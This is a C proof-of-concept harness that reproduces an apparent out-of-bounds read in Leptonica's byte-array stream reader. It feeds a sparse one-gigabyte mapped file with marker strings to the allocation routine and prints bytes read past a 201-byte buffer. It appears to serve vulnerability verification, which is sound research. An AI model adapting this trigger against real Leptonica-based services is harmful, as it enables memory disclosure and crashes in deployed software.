/* Leptonica CVE-2026-137063 staged harness. The two functions below are
 * verbatim excerpts of upstream bytearray.c; everything else is a stand-in.
 * The 1,000,000,001-byte stream is a sparse file mapped read-only, so the
 * experiment needs no gigabyte of resident memory. */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/mman.h>

typedef uint8_t  l_uint8;
typedef uint32_t l_uint32;
typedef int      l_int32;
typedef int      l_atomic;
typedef struct L_Bytea {
    size_t           nalloc;
    size_t           size;
    l_atomic         refcount;
    l_uint8         *data;
} L_BYTEA;

#define LEPT_CALLOC calloc
#define LEPT_FREE lept_free
#define ERROR_PTR(msg, fn, ret) (fprintf(stderr, "%s: %s\n", (fn), (msg)), (ret))

static void
l_byteaDestroy(L_BYTEA **pba)
{
    if (*pba) { free((*pba)->data); free(*pba); *pba = NULL; }
}

/* Stand-in for l_binaryReadStream: the mapped sparse file is the stream. */
static const l_uint8 *g_src;
static size_t g_n;
static void lept_free(void *p) { if (p == (void *)g_src) return; free(p); }
static l_uint8 *
l_binaryReadStream(void *fp, size_t *pnbytes)
{
    (void)fp;
    *pnbytes = g_n;
    return (l_uint8 *)g_src;
}

#ifdef BOUNDED
/* Synthetic consumer: bounds the copied window so the chosen bytes that land
 * past the 201-byte allocation can be read in a non-ASan build. Not a real
 * Leptonica consumer; used only to label the rung-4 PARTIAL observation. */
static void *my_memcpy(void *dst, const void *src, size_t n);
#define memcpy my_memcpy
#endif

#include "consts.inc"
#include CREATE_INC
#include STREAM_INC

#ifdef BOUNDED
static void *my_memcpy(void *dst, const void *src, size_t n)
{
    if (n > 216) n = 216;
    return __builtin_memcpy(dst, src, n);
}
#endif

static void *
map_sparse(size_t n)
{
    char path[] = "/tmp/lptnXXXXXX";
    int fd = mkstemp(path);
    void *p;
    const char *pat = "MISHE-LEPTONICA-OOB";
    size_t offs[] = { 201, 256, 4096, 65536 };
    size_t i;
    if (fd < 0) exit(2);
    unlink(path);
    if (ftruncate(fd, (off_t)n) != 0) exit(2);
    for (i = 0; i < sizeof(offs)/sizeof(offs[0]); i++)
        if (pwrite(fd, pat, strlen(pat), (off_t)offs[i]) != (ssize_t)strlen(pat)) exit(2);
    p = mmap(NULL, n, PROT_READ, MAP_PRIVATE, fd, 0);
    if (p == MAP_FAILED) exit(2);
    close(fd);
    return p;
}

int
main(void)
{
    L_BYTEA *ba;
    const char *env = getenv("LPTN_N");
    int i;
    g_n = env ? (size_t)strtoull(env, NULL, 10) : 1000000001ULL;
    g_src = map_sparse(g_n);
    ba = l_byteaInitFromStream((FILE *)0x1);
    printf("N=%zu\n", g_n);
    if (!ba) { printf("BA=NULL\n"); return 0; }
    printf("BA=NONNULL NALLOC=%zu SIZE=%zu\n", ba->nalloc, ba->size);
#ifdef BOUNDED
    printf("PAST_ALLOC=");
    for (i = 0; i < 16; i++) printf("%02x", ba->data[201 + i]);
    printf("\n");
#else
    (void)i;
#endif
    l_byteaDestroy(&ba);
    return 0;
}
